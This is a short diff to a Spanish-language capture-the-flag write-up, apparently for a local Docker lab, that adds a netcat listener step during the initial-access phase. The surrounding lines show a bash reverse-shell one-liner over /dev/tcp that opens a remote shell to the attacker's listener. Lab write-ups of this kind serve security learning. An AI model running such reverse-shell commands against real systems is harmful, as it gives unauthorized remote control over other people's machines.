@@ -506,10 +506,15 @@ estamos dentro pero....horror al cabo de un tiempo cierra conexión, para saltar
 listening on [any] 5002 ...
 connect to [172.17.0.183] from (UNKNOWN) [172.17.0.2] 42780
 ```
+abro un listener con nc en el puerto 6666:
+```bash
+sudo nc -nvlp 6666
+```
 desde el listener del puerto 5002:
 ```bash
 bash -c "bash -i >& /dev/tcp/172.17.0.183/6666 0>&1"
 ```
+ya tengo entablada una conexión que no se me cierra 
 ## fase escalada usuario juan
 
 tratamiento de la tty
